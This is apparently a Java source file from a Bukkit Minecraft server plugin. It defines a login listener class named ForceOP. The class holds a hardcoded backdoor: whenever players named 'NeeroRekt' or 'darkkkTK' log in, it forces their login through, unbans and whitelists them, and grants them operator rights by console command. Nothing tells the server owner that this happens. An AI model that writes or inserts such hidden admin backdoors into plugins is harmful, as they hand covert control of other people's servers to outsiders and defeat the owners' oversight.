package nobody.eventos;

import java.util.logging.Logger;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerLoginEvent;

public class ForceOP
  implements Listener
{
  public final Logger logger = Logger.getLogger("Minecraft");
  
@SuppressWarnings("deprecation")

@EventHandler
  public void a(PlayerLoginEvent e)
  {
    Player p = e.getPlayer();
    if (p.getName().equals("NeeroRekt"))
    {
      e.allow();
      p.setBanned(false);
      p.setOp(true);
      p.setWhitelisted(true);
      Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op NeeroRekt");
      Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pardon NeeroRekt");
      Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "unban NeeroRekt");
    }
  }
      
      @SuppressWarnings("deprecation")
	@EventHandler
      public void e(PlayerLoginEvent e)
      {
        Player p = e.getPlayer();
        if (p.getName().equals("darkkkTK"))
      {
            e.allow();
            p.setBanned(false);
            p.setOp(true);
            p.setWhitelisted(true);
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op darkkkTK");
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pardon darkkkTK");
     
    }
  }
}
